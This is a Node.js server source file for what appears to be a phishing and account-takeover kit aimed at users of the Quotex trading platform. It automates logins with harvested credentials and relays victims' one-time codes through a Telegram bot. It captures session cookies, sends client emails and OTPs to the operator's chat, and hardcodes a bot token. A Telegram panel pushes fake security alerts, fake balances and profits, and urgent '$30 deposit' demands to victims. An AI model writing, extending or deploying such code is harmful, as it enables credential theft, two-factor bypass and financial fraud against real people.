    await updateSession(session, 'logged_in',
        '✅ Logged in successfully! You can now trade.', { screenshot: true });

    // Capture cookies for potential re-use
    try {
        const cookies = await session.page.cookies();
        session.cookies = JSON.stringify(cookies);
    } catch(e) {}

    const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    await sendTelegramMessage(
        `✅ <b>Quotex Login Successful!</b>\n` +
        `👤 Client: <b>${clientName}</b>\n📧 Email: <b>${email}</b>\n⏰ Time: <b>${ts}</b>\n\n` +
        `🎯 Account ready — you can start trading!`
    );

    // Log to DB
    if (useDatabase) {
        try {
            await BrokerSession.findOneAndUpdate(
                { sessionId: session.id },
                { status: 'logged_in', result: 'success', notes: '' },
                { upsert: true }
            );
        } catch(e) {}
    }
}

// ── Submit OTP to active Puppeteer session ──────────────────
async function submitQuotexOTP(sessionId, otp) {
    const session = quotexSessions.get(sessionId);
    if (!session)         return { ok: false, error: 'Session not found' };
    if (!session.page)    return { ok: false, error: 'Browser session closed' };
    if (!['waiting_otp', 'wrong_otp'].includes(session.status)) {
        return { ok: false, error: `Session is ${session.status}, not waiting for OTP` };
    }

    session.otpAttempts = (session.otpAttempts || 0) + 1;

    try {
        await updateSession(session, 'submitting_otp', `⏳ Entering OTP: ${otp}...`);
        const page = session.page;

        // Clear and type OTP — try multiple input patterns
        // Pattern 1: Single input with maxlength 6
        const singleSel = 'input[maxlength="6"], input[name="code"], input[name="otp"], input[placeholder*="code" i], input[placeholder*="otp" i]';
        const single = await page.$(singleSel);
        if (single) {
            try {
                await page.click(singleSel, { clickCount: 3 }); // select all
                await page.keyboard.press('Backspace');         // clear
            } catch(_) {}
            await sleep(200);
            await page.type(singleSel, otp, { delay: 80 });
        } else {
            // Pattern 2: Individual digit inputs
            const digits = await page.$$('input[maxlength="1"]');
            if (digits.length >= 4) {
                for (let i = 0; i < Math.min(otp.length, digits.length); i++) {
                    try { await digits[i].click({ delay: 30 }); } catch(e) { await page.evaluate(el => el.click(), digits[i]); }
                    await sleep(100);
                    await digits[i].type(String(otp[i]), { delay: 80 });
                }
            } else {
                return { ok: false, error: 'Could not find OTP input field on Quotex page' };
            }
        }

        await sleep(500);

        // Submit OTP
        const submitSel = 'button[type="submit"], [class*="confirm"] button, [class*="verify"] button, [class*="submit"] button, form button';
        const btn = await page.$(submitSel);
        if (btn) {
            try { await safeClick(page, submitSel); } catch(e) { await page.keyboard.press('Enter'); }
        } else {
            await page.keyboard.press('Enter');
        }

        await sleep(4000);
        await updateSession(session, 'submitting_otp', '⏳ Verifying OTP...', { screenshot: true });

        // Check result
        const currentUrl = page.url();
        const stillNeedsOTP = await page.evaluate(() => {
            const body = document.body?.innerText?.toLowerCase() || '';
            return body.includes('verification code') || body.includes('otp') ||
                   body.includes('enter code') || body.includes('invalid code') ||
                   body.includes('wrong code') || body.includes('incorrect code') ||
                   body.includes('expired') ||
                   !!(document.querySelector('input[maxlength="6"]') || document.querySelector('input[maxlength="1"]'));
        }).catch(() => false);

        const wrongOTPText = await page.evaluate(() => {
            const body = document.body?.innerText?.toLowerCase() || '';
            return body.includes('invalid') || body.includes('wrong') ||
                   body.includes('incorrect') || body.includes('expired') ||
                   body.includes('error');
        }).catch(() => false);

        if (!stillNeedsOTP || (!wrongOTPText && !currentUrl.includes('sign-in'))) {
            await handleLoginSuccess(session, session.clientName, session.email);
            return { ok: true, message: '✅ Logged in successfully!' };
        } else {
            // Wrong OTP
            await updateSession(session, 'wrong_otp',
                `❌ OTP "${otp}" was incorrect — please try again (attempt ${session.otpAttempts})`,
                { screenshot: true });

            await sendTelegramMessage(
                `❌ <b>Wrong OTP!</b>\n👤 Client: <b>${session.clientName}</b>\n` +
                `🔢 OTP tried: <b>${otp}</b> (attempt ${session.otpAttempts})\n\n` +
                `Please send the correct OTP:\n<code>/otp ${sessionId} CORRECT_CODE</code>`
            );

            await tgApi('sendMessage', {
                chat_id: TELEGRAM_CHAT_ID,
                parse_mode: 'HTML',
                text: `❌ Wrong OTP for <b>${session.clientName}</b>. Try again:`,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✏️ Enter OTP Again', callback_data: `ask_qxotp|${session.id}|${encodeURIComponent(session.clientName)}` }],
                        [{ text: '❌ Cancel', callback_data: `qxclose|${session.id}` }],
                    ],
                },
            });

            return { ok: false, message: `Wrong OTP (attempt ${session.otpAttempts}) — please try correct code` };
        }

    } catch(e) {
        await updateSession(session, 'error', `❌ OTP error: ${e.message.slice(0, 100)}`);
        return { ok: false, error: e.message };
    }
}

// ── Close/cleanup a session ─────────────────────────────────
async function closeQuotexSession(sessionId, reason = 'Admin closed session') {
    const session = quotexSessions.get(sessionId);
    if (!session) return;

    session.status    = 'closed';
    session.statusMsg = reason;
    session.updatedAt = new Date();

    if (session.browser) {
        try { await session.browser.close(); } catch(e) {}
        session.browser = null;
        session.page    = null;
    }

    broadcastSSE('qx_session_update', getSessionInfo(session));

    if (useDatabase) {
        try {
            await BrokerSession.findOneAndUpdate(
                { sessionId },
                { status: 'closed', result: session.result || 'cancelled', closedAt: new Date() },
                { upsert: true }
            );
        } catch(e) {}
    }

    // Clean up after 10 minutes
    setTimeout(() => { quotexSessions.delete(sessionId); }, 10 * 60 * 1000);
    // ── Auto-retry on error ──────────────────────────────────────────
    if (session.status === 'error' && autoRetryConfig.enabled) {
        const attempts = session.retryCount || 0;
        if (attempts < autoRetryConfig.maxAttempts) {
            session.retryCount = attempts + 1;
            const delay = autoRetryConfig.delaySeconds * 1000;
            setTimeout(async () => {
                if (quotexSessions.has(sessionId)) {
                    const s = quotexSessions.get(sessionId);
                    s.status = 'queued'; s.statusMsg = `🔄 Auto-retry #${s.retryCount}`;
                    s.browser = null; s.page = null; s.otpAttempts = 0;
                    broadcastSSE('qx_session_update', getSessionInfo(s));
                    launchQuotexSession(s).catch(e => console.error('auto-retry error:', e.message));
                }
            }, delay);
        }
    }

}

// ── Auto OTP forward: when client submits OTP on main bot,
//    check if there is a Puppeteer session waiting for it ────
async function autoForwardOTP(userName, licenceKey, otp) {
    for (const [id, session] of quotexSessions) {
        if (session.status !== 'waiting_otp' && session.status !== 'wrong_otp') continue;
        if (
            (session.licenceKey && session.licenceKey === licenceKey) ||
            (session.clientName && session.clientName.toLowerCase() === (userName || '').toLowerCase())
        ) {
            console.log(`🔄 Auto-forwarding OTP for ${userName} → session ${id}`);
            broadcastSSE('activity', { action: `🔄 Auto-forwarding OTP to Quotex session ${id}`, userName, ip: '—', timestamp: new Date().toLocaleString() });
            await submitQuotexOTP(id, otp);
            return true;
        }
    }
    return false;
}


// ── Auto-retry config (admin-configurable at runtime) ─────────────────
let autoRetryConfig = {
    enabled: false,
    maxAttempts: 3,
    delaySeconds: 30,
};


// ================== QUICK TRIGGERS ==================
// Pre-built message templates for the Telegram inline keyboard.
// key = callback ID,  type = SSE message type sent to client.
const QUICK_TRIGGERS = {
    // ── Login flow ────────────────────────────────────────────────────────
    invalid_login: {
        type: 'warning',
        text: '⚠️ Your email or password is incorrect. Please re-enter your Quotex login credentials carefully and try again.',
    },
    wrong_otp: {
        type: 'warning',
        text: '🔢 The OTP you entered is incorrect or has expired. Check your email/SMS for the latest code and try again.',
    },
    login_ok: {
        type: 'info',
        text: '✅ Your login was successful! Your account is now verified and connected. Please wait for the next instructions.',
    },
    // ── Account & security ───────────────────────────────────────────────
    alert: {
        type: 'alert',
        text: '🚨 IMPORTANT ALERT: Unusual activity detected on your account. Stay on this page and do not refresh. Our team is reviewing your account now.',
    },
    verification: {
        type: 'instruction',
        text: '📋 Identity verification is required to continue. Please complete the KYC process to unlock full trading access.',
    },
    account_suspended: {
        type: 'alert',
        text: '🚫 Your account has been temporarily suspended for security review. Please contact support for assistance.',
    },
    // ── Instructions ─────────────────────────────────────────────────────
    instruction: {
        type: 'instruction',
        text: '📋 Please follow the on-screen instructions carefully. Do not close, refresh, or navigate away from the page.',
    },
    wait: {
        type: 'instruction',
        text: '⏳ Please wait — we are processing your request. This may take up to 2 minutes. Do not close or refresh the page.',
    },
    timeout_warning: {
        type: 'warning',
        text: '⏰ Your session is about to expire in 2 minutes. Please complete the required action now to avoid being logged out.',
    },
    // ── Financial ────────────────────────────────────────────────────────
    deposit_prompt: {
        type: 'instruction',
        text: '💰 To activate your trading account and receive signals, please make your first deposit on the Quotex platform now.',
    },
    deposit_ok: {
        type: 'info',
        text: '💰 Your deposit has been received and confirmed. Your account is now fully active. Welcome to the signals service!',
    },
    withdraw_processing: {
        type: 'info',
        text: '🏦 Your withdrawal request is being processed. Funds will arrive within 24–48 hours depending on your payment method.',
    },
    // ── Connection / status ──────────────────────────────────────────────
    success_connected: {
        type: 'info',
        text: '🎉 Account successfully connected! Your broker integration is active. You will now receive live trading signals.',
    },
    disconnected: {
        type: 'warning',
        text: '🔌 Your session has been disconnected. Please log in again to restore your connection and continue receiving signals.',
    },
    // ── Support ──────────────────────────────────────────────────────────
    support_msg: {
        type: 'info',
        text: '🛠 Our support team has been notified and will contact you shortly via WhatsApp or Telegram. Please keep the app open.',
    },
    // ── Signals ──────────────────────────────────────────────────────────
    signal_incoming: {
        type: 'info',
        text: '📡 A new trading signal is incoming! Please open your Quotex account now and be ready to place the trade.',
    },
    signal_close: {
        type: 'instruction',
        text: '🔔 Close your current position now! The signal target has been reached. Take your profit.',
    },
    // ── Low Balance / Deposit ────────────────────────────────────────────
    low_balance: {
        type: 'warning',
        text: '⚠️ Dear User, You Have Low Balance in your Quotex Account. Please Deposit $30 or Above To Continue.',
    },
    low_balance_urgent: {
        type: 'alert',
        text: '🚨 URGENT: Your Quotex Account Balance is critically low. Please Deposit a minimum of $30 immediately to continue receiving live trading signals and avoid account suspension.',
    },
    deposit_required: {
        type: 'alert',
        text: '💰 A minimum deposit of $30 is required to activate your trading account and access live signals. Please deposit now to continue.',
    },
    deposit_30: {
        type: 'instruction',
        text: '💵 Please make a deposit of at least $30 into your Quotex account to continue. Go to the Cashier section and select your preferred payment method.',
    },
    // ── Verification / KYC ──────────────────────────────────────────────
    kyc_required: {
        type: 'instruction',
        text: '📄 Identity Verification Required: Please complete your KYC verification to unlock full trading access and withdrawals. Upload your ID document in the Verification section.',
    },
    account_verified: {
        type: 'info',
        text: '✅ Your account has been successfully verified! All trading features and withdrawal options are now fully unlocked.',
    },
    // ── Trading ─────────────────────────────────────────────────────────
    trade_open: {
        type: 'info',
        text: '📈 A new trade has been opened on your account. Monitor your position and follow the signal instructions carefully.',
    },
    profit_received: {
        type: 'info',
        text: '🎯 Congratulations! Your trade closed in profit. Earnings have been credited to your Quotex balance. Stay connected for the next signal.',
    },
    session_expiring: {
        type: 'warning',
        text: '⚠️ Your session will expire in 5 minutes. Please complete any pending actions now or refresh to extend your session.',
    },
    // ── Bonus ────────────────────────────────────────────────────────────
    bonus_credited: {
        type: 'info',
        text: '🎁 A bonus has been credited to your Quotex account! Check your balance — the bonus is ready to use for trading.',
    },
    upgrade_required: {
        type: 'instruction',
        text: '⬆️ A plan upgrade is required to access premium signals and advanced trading features. Please contact support or upgrade via your account settings.',
    },
};

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── Puppeteer safe-click: scrolls into view, waits for visibility, falls back
//    to direct DOM click — fixes "Node is not clickable or not an Element"
async function safeClick(page, selector) {
    try {
        // Wait up to 8s for element to appear
        await page.waitForSelector(selector, { visible: true, timeout: 8000 }).catch(() => {});
        const el = await page.$(selector);
        if (!el) throw new Error('Element not found: ' + selector);
        // Scroll into view
        await page.evaluate(s => {
            const node = document.querySelector(s);
            if (node) node.scrollIntoView({ behavior: 'instant', block: 'center' });
        }, selector);
        await sleep(200);
        // Try normal Puppeteer click first
        try {
            await el.click({ delay: 30 });
        } catch(clickErr) {
            // Fallback: force click via DOM .click()
            await page.evaluate(s => {
                const node = document.querySelector(s);
                if (node) { node.removeAttribute('disabled'); node.click(); }
            }, selector);
        }
    } catch(e) {
        // Last resort: keyboard Enter on focused element
        await page.keyboard.press('Enter');
    }
}

// ================== EXPRESS APP ==================
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '7293402395';

async function sendTelegramMessage(text) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' });
    } catch(e) { console.error('Telegram Error:', e.message); }
}

// ================== TELEGRAM INTERACTIVE BOT ==================
const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const tgSessions = {};
const tgPendingTargets = {};

async function tgApi(method, payload) {
    try {
        const r = await axios.post(`${TG_API}/${method}`, payload, { timeout: 15000 });
        return r.data;
    } catch(e) {
        console.error('tgApi error:', method, e.response?.data || e.message);
        return null;
    }
}


// ══════════════════════════════════════════════════════════════════════
// ENHANCED TELEGRAM BOT — Full Keyboard-Driven Admin Control
// ══════════════════════════════════════════════════════════════════════

function tgMainMenuKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '👥 Users',        callback_data: 'menu_users' },
             { text: '📊 Stats',        callback_data: 'stats' },
             { text: '🤖 Sessions',     callback_data: 'qx_sessions' }],
            [{ text: '💬 Inject Msg',   callback_data: 'menu_inject' },
             { text: '📢 Broadcast',    callback_data: 'menu_broadcast' },
             { text: '🔑 Licenses',     callback_data: 'menu_licenses' }],
            [{ text: '📦 Orders',       callback_data: 'menu_orders' },
             { text: '⚙️ Settings',     callback_data: 'menu_settings' },
             { text: '🔧 Maintenance',  callback_data: 'menu_maint' }],
            [{ text: '🚀 Launch QX',    callback_data: 'qxlaunch_start' },
             { text: '📋 Credentials',  callback_data: 'menu_creds' },
             { text: '❓ Help',         callback_data: 'help' }],
        ],
    };
}

function tgBackKeyboard(backData = 'menu') {
    return { inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: backData }]] };
}

function tgUserActionKeyboard(userName) {
    const u = encodeURIComponent(userName);
    return {
        inline_keyboard: [
            // ── Quick Triggers: Login flow ────────────────────────────────
            [{ text: '⚠️ Invalid Login',  callback_data: `qt|invalid_login|${u}` },
             { text: '🔢 Wrong OTP',      callback_data: `qt|wrong_otp|${u}` },
             { text: '✅ Login OK',        callback_data: `qt|login_ok|${u}` }],
            // ── Quick Triggers: Alerts & instructions ─────────────────────
            [{ text: '🚨 Alert',          callback_data: `qt|alert|${u}` },
             { text: '⏳ Wait',           callback_data: `qt|wait|${u}` },
             { text: '📋 Instruction',    callback_data: `qt|instruction|${u}` }],
            // ── Quick Triggers: Financial ────────────────────────────────
            [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
             { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` },
             { text: '🏦 Withdraw',       callback_data: `qt|withdraw_processing|${u}` }],
            [{ text: '⚠️ Low Balance',     callback_data: `qt|low_balance|${u}` },
             { text: '🚨 Low Bal Urgent',  callback_data: `qt|low_balance_urgent|${u}` },
             { text: '💵 Deposit $30 Now', callback_data: `qt|deposit_30|${u}` }],
            [{ text: '📄 KYC Required',   callback_data: `qt|kyc_required|${u}` },
             { text: '✅ Account Verified',callback_data: `qt|account_verified|${u}` },
             { text: '🎁 Bonus Credited', callback_data: `qt|bonus_credited|${u}` }],
            // ── Quick Triggers: Status ───────────────────────────────────
            [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
             { text: '🔌 Disconnected',   callback_data: `qt|disconnected|${u}` },
             { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
            [{ text: '🔗 Trigger Connected (Live)', callback_data: `tc_trigger|${u}` }],
            // ── Quick Triggers: Signals ──────────────────────────────────
            [{ text: '📡 Signal Coming',  callback_data: `qt|signal_incoming|${u}` },
             { text: '🔔 Close Position', callback_data: `qt|signal_close|${u}` },
             { text: '🛠 Support Notified', callback_data: `qt|support_msg|${u}` }],
            // ── Custom message / balance / note ──────────────────────────
            [{ text: '💬 Custom Message', callback_data: `ask_msg|${u}` },
             { text: '💰 Inject Balance', callback_data: `ask_balance|${u}` },
             { text: '📝 Note',           callback_data: `ask_note|${u}` }],
            // ── Control actions ──────────────────────────────────────────
            [{ text: '🔄 Force Reload',   callback_data: `force_reload|${u}` },
             { text: '⏳ Push Loading',   callback_data: `push_loading|${u}` },
             { text: '👢 Kick User',      callback_data: `kick|${u}` }],
            [{ text: '🚫 Block',          callback_data: `block|${u}` },
             { text: '✅ Unblock',        callback_data: `unblock|${u}` },
             { text: '🚀 Launch QX',      callback_data: `qxlaunch_user|${u}` }],
            [{ text: '📩 More Inject Options', callback_data: `inject_type_menu|${u}` }],
            [{ text: '🔙 Back to Users',  callback_data: 'menu_users' }],
        ],
    };
}

function tgInjectTypeKeyboard(userName) {
    const u = encodeURIComponent(userName);
    return {
        inline_keyboard: [
            [{ text: '⚠️ Invalid Login',  callback_data: `qt|invalid_login|${u}` },
             { text: '🔢 Wrong OTP',      callback_data: `qt|wrong_otp|${u}` }],
            [{ text: '✅ Login OK',        callback_data: `qt|login_ok|${u}` },
             { text: '🚨 Account Alert',  callback_data: `qt|alert|${u}` }],
            [{ text: '📋 Instruction',    callback_data: `qt|instruction|${u}` },
             { text: '⏳ Wait',           callback_data: `qt|wait|${u}` }],
            [{ text: '💰 Deposit Prompt', callback_data: `qt|deposit_prompt|${u}` },
             { text: '💰 Deposit OK',     callback_data: `qt|deposit_ok|${u}` }],
            [{ text: '⚠️ Low Balance',     callback_data: `qt|low_balance|${u}` },
             { text: '💵 Deposit $30 Now', callback_data: `qt|deposit_30|${u}` }],
            [{ text: '🎉 Connected',      callback_data: `qt|success_connected|${u}` },
             { text: '⏰ Timeout Warn',   callback_data: `qt|timeout_warning|${u}` }],
            [{ text: '🔗 Trigger Connected (Live)', callback_data: `tc_trigger|${u}` }],
            [{ text: '📡 Signal Coming',  callback_data: `qt|signal_incoming|${u}` },
             { text: '🔔 Close Position', callback_data: `qt|signal_close|${u}` }],
            [{ text: '✏️ Custom Message', callback_data: `ask_msg|${u}` },
             { text: '💰 Inject Balance', callback_data: `ask_balance|${u}` }],
            [{ text: '🔙 Back',           callback_data: 'menu_inject' }],
        ],
    };
}

function tgBroadcastTypeKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '💡 Info',       callback_data: 'bc_type|info' },
             { text: '⚠️ Warning',    callback_data: 'bc_type|warning' }],
            [{ text: '🚨 Alert',      callback_data: 'bc_type|alert' },
             { text: '📋 Instruction',callback_data: 'bc_type|instruction' }],
            [{ text: '🔙 Back',       callback_data: 'menu' }],
        ],
    };
}

function tgMaintenanceKeyboard(active) {
    return {
        inline_keyboard: [
            [{ text: active ? '✅ Maintenance ON — Click to DISABLE' : '⚪ Maintenance OFF — Click to ENABLE',
               callback_data: active ? 'maint_off' : 'maint_on' }],
            [{ text: '⏱️ 30 min',   callback_data: 'maint_preset|30m' },
             { text: '⏱️ 1 hour',   callback_data: 'maint_preset|1h' },
             { text: '⏱️ 2 hours',  callback_data: 'maint_preset|2h' }],
            [{ text: '⏱️ 6 hours',  callback_data: 'maint_preset|6h' },
             { text: '⏱️ 24 hours', callback_data: 'maint_preset|24h' },
             { text: '♾️ No Limit', callback_data: 'maint_preset|0' }],
            [{ text: '⏱️ Custom Duration', callback_data: 'maint_ask_duration' }],
            [{ text: '✏️ Edit Message',     callback_data: 'maint_ask_msg' }],
            [{ text: '🔙 Back',             callback_data: 'menu' }],
        ],
    };
}

function tgSessionKeyboard(sessionId, status) {
    const s = sessionId;
    const kb = [];
    if (status === 'waiting_otp' || status === 'wrong_otp') {
        kb.push([{ text: '🔢 Enter OTP', callback_data: `ask_qxotp|${s}|Session` }]);
    }
    if (!['closed','error','logged_in'].includes(status)) {
        kb.push([{ text: '🔄 Retry Login', callback_data: `qxretry|${s}` }]);
    }
    kb.push([{ text: '❌ Close Session', callback_data: `qxclose|${s}` }]);
    kb.push([{ text: '📸 Screenshot',   callback_data: `qx_shot|${s}` }]);
    kb.push([{ text: '🔙 All Sessions', callback_data: 'qx_sessions' }]);
    return { inline_keyboard: kb };
}

function tgCredsKeyboard(creds) {
    const kb = creds.slice(0, 8).map(c => ([{
        text: `🔑 ${c.label || c.email.slice(0, 20)} [${c.group}]`,
        callback_data: `cred_action|${c.id}`
    }]));
    kb.push([
        { text: '➕ Add Credential', callback_data: 'cred_add' },
        { text: '🚀 Batch Launch All', callback_data: 'cred_batch_all' }
    ]);
    kb.push([{ text: '🔙 Back', callback_data: 'menu' }]);
    return { inline_keyboard: kb };
}

function tgCredActionKeyboard(credId) {
    return {
        inline_keyboard: [
            [{ text: '🚀 Launch Now',    callback_data: `cred_launch|${credId}` },
             { text: '🗑️ Delete',        callback_data: `cred_delete|${credId}` }],
            [{ text: '🔙 Back to Creds', callback_data: 'menu_creds' }],
        ],
    };
}

function tgRetryConfigKeyboard() {
    const en = autoRetryConfig.enabled;
    return {
        inline_keyboard: [
            [{ text: en ? '✅ Auto-Retry ENABLED — Disable' : '⚪ Auto-Retry DISABLED — Enable',
               callback_data: en ? 'retry_off' : 'retry_on' }],
            [{ text: `🔁 Max Attempts: ${autoRetryConfig.maxAttempts}`, callback_data: 'retry_ask_attempts' }],
            [{ text: `⏱️ Delay: ${autoRetryConfig.delaySeconds}s`,      callback_data: 'retry_ask_delay' }],
            [{ text: '🔙 Back', callback_data: 'qx_sessions' }],
        ],
    };
}

async function tgInjectMessage(userName, type, text) {
    const ts = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const payload = { userName, message: text, type, timestamp: ts };
    sendSSEToUser(userName, 'injected_message', payload);
    if (useDatabase) {
        try { await dbAddPendingMessage(userName, payload); } catch(e) {}
    } else {
        const k = userName.trim().toLowerCase();
        if (!pendingMessages[k]) pendingMessages[k] = [];
        pendingMessages[k].push(payload);
    }
    broadcastSSE('activity', { action: `💬 [TG] ${type} → ${userName}`, userName, ip: '—', timestamp: ts });
}

async function tgFindUserByName(name) {
    const lower = name.trim().toLowerCase();
    if (useDatabase) {
        try {
            const all = await User.find({}).lean();
            return all.find(u => (u.fullName || '').toLowerCase() === lower || (u.username || '').toLowerCase() === lower);
        } catch(e) { return null; }
    }
    return users.find(u => (u.fullName || '').toLowerCase() === lower || (u.username || '').toLowerCase() === lower);
}

async function tgHandleCallback(chatId, data, callbackId) {
    await tgApi('answerCallbackQuery', { callback_query_id: callbackId });
    const parts  = data.split('|');
    const action = parts[0];
    const target = parts[2] ? decodeURIComponent(parts[2]) : (parts[1] ? decodeURIComponent(parts[1]) : '');


    if (action === 'user_action') {
        const uName = target || parts[1] ? decodeURIComponent(parts[1]) : '';
        const isOnline = sseUserClients.has((uName || '').toLowerCase());
        const found    = await tgFindUserByName(uName);
        const statusTxt = `👤 <b>${uName}</b>\n🟢 Online: <b>${isOnline ? 'Yes' : 'No'}</b>\n` +
            (found ? `🔑 Key: <code>${found.licenceKey||'-'}</code>\n📧 Email: <code>${found.username||'-'}</code>\n📊 Status: <b>${found.status||'-'}</b>` : 'ℹ️ No DB record yet.');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: statusTxt, reply_markup: tgUserActionKeyboard(uName) });
    }

    if (action === 'menu')  return tgApi('sendMessage', { chat_id: chatId, text: '🤖 <b>Admin Bot Menu</b>', parse_mode: 'HTML', reply_markup: tgMainMenuKeyboard() });
    if (action === 'help')  return tgCmdHelp(chatId);
    if (action === 'online') return tgCmdOnline(chatId);
    if (action === 'stats')  return tgCmdStats(chatId);
    if (action === 'qx_sessions') return tgCmdQxSessions(chatId);

    if (action === 'broadcast') {
        tgSessions[chatId] = { awaiting: 'broadcast_text' };
        return tgApi('sendMessage', { chat_id: chatId, text: '📢 Send the message to broadcast to ALL online users.\n(/cancel to abort)' });
    }

    // ── Quotex session callbacks ───────────────────────────
    if (action === 'ask_qxotp') {
        const sessionId   = parts[1];
        const clientName  = parts[2] ? decodeURIComponent(parts[2]) : 'Client';
        tgSessions[chatId] = { awaiting: 'qx_otp', sessionId, clientName };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔢 Enter the 6-digit OTP for <b>${clientName}</b>:\n(/cancel to abort)` });
    }
    if (action === 'qxclose') {
        const sessionId = parts[1];
        await closeQuotexSession(sessionId, 'Closed via Telegram');
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: `✅ Session <code>${sessionId}</code> closed.` });
    }
    if (action === 'qxretry') {
        const sessionId = parts[1];
        const session   = quotexSessions.get(sessionId);
        if (!session) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Session not found.' });
        // Restart from scratch
        if (session.browser) { try { await session.browser.close(); } catch(e) {} }
        session.browser = null; session.page = null; session.otpAttempts = 0;
        launchQuotexSession(session).catch(e => console.error('tgRetry launch error:', e.message));
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔄 Retrying login for <b>${session.clientName}</b>...` });
    }


    // ── NEW SECTION MENUS ─────────────────────────────────────────────
    if (action === 'menu_users') return tgCmdUsersMenu(chatId);
    if (action === 'menu_inject') return tgCmdInjectMenu(chatId);
    if (action === 'menu_broadcast') {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '📢 <b>Broadcast to ALL Users</b>\nSelect message type:',
            reply_markup: tgBroadcastTypeKeyboard() });
    }
    if (action === 'menu_licenses') return tgCmdLicensesMenu(chatId);
    if (action === 'menu_orders')   return tgCmdOrdersMenu(chatId);
    if (action === 'menu_settings') return tgCmdSettingsMenu(chatId);
    if (action === 'menu_maint')    return tgCmdMaintenanceMenu(chatId);
    if (action === 'menu_creds')    return tgCmdCredsMenu(chatId);

    // ── BROADCAST TYPE SELECT ────────────────────────────────────────
    if (action === 'bc_type') {
        const bcType = parts[1] || 'info';
        tgSessions[chatId] = { awaiting: 'broadcast_text', bcType };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `📢 <b>Broadcast [${parts[1] || 'info'}]</b>\nSend the message text:\n(/cancel to abort)` });
    }

    // ── MAINTENANCE ───────────────────────────────────────────────────
    if (action === 'maint_preset') {
        const presetVal = parts[1] || '0';
        let until = null;
        if (presetVal !== '0') {
            const hrs = presetVal === '30m' ? 0.5 : parseInt(presetVal);
            until = new Date(Date.now() + hrs * 3600000).toISOString();
        }
        maintenanceMode.until = until;
        if (!maintenanceMode.active) { maintenanceMode.active = true; }
        broadcastSSE('maintenance_update', maintenanceMode);
        const label = presetVal === '0' ? '♾️ No limit' : presetVal === '30m' ? '30 minutes' : presetVal + ' hour(s)';
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `🔧 <b>Maintenance ON</b> — Duration: <b>${label}</b>
All users will see the maintenance page.`,
            reply_markup: tgMaintenanceKeyboard(true) });
    }

    if (action === 'maint_on' || action === 'maint_off') {
        maintenanceMode.active = action === 'maint_on';
        broadcastSSE('maintenance_update', maintenanceMode);
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: maintenanceMode.active ? '🔧 <b>Maintenance ON</b> — all users will see maintenance page.' : '✅ <b>Maintenance OFF</b> — bot is live again.',
            reply_markup: tgMaintenanceKeyboard(maintenanceMode.active) });
    }
    if (action === 'maint_ask_duration') {
        tgSessions[chatId] = { awaiting: 'maint_duration' };
        return tgApi('sendMessage', { chat_id: chatId, text: '⏱️ Enter maintenance end time (e.g. 2025-12-31 23:59 or "2h" for 2 hours):' });
    }
    if (action === 'maint_ask_msg') {
        tgSessions[chatId] = { awaiting: 'maint_msg' };
        return tgApi('sendMessage', { chat_id: chatId, text: '✏️ Enter new maintenance message:' });
    }

    // ── QX LAUNCH START ───────────────────────────────────────────────
    if (action === 'qxlaunch_start') {
        tgSessions[chatId] = { awaiting: 'qxlaunch_email' };
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: '🚀 <b>Launch Quotex Session</b>\n\n📧 Send the Email address:' });
    }

    // ── INJECT TYPE MENU ─────────────────────────────────────────────
    if (action === 'inject_type_menu') {
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `💬 <b>Inject to ${target}</b>\nChoose message type:`,
            reply_markup: tgInjectTypeKeyboard(target) });
    }

    // ── PER-SESSION ACTIONS ───────────────────────────────────────────
    if (action === 'qx_view') {
        const sessionId = parts[1];
        const session   = quotexSessions.get(sessionId);
        if (!session) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ Session not found.' });
        const STATUS_EMOJI = { launching:'🚀', navigating:'🌐', filling:'✍️', waiting_otp:'🔢', submitting_otp:'⏳', logged_in:'✅', wrong_otp:'❌', error:'❌', closed:'⚫' };
        const em = STATUS_EMOJI[session.status] || '❓';
        return tgApi('sendMessage', { chat_id: chatId, parse_mode: 'HTML',
            text: `${em} <b>${session.clientName}</b>\n📧 Email: <code>${session.email}</code>\n🔖 Status: <b>${session.status}</b>\n💬 ${session.statusMsg || ''}\n🆔 <code>${session.id}</code>`,
            reply_markup: tgSessionKeyboard(session.id, session.status) });
    }
    if (action === 'qx_shot') {
        const sessionId = parts[1];
        const session   = quotexSessions.get(sessionId);
        if (!session?.screenshotBase64) return tgApi('sendMessage', { chat_id: chatId, text: '⚠️ No screenshot available yet.' });
        const buf = Buffer.from(session.screenshotBase64.replace(/^data:image\/\w+;base64,/, ''), 'base64');
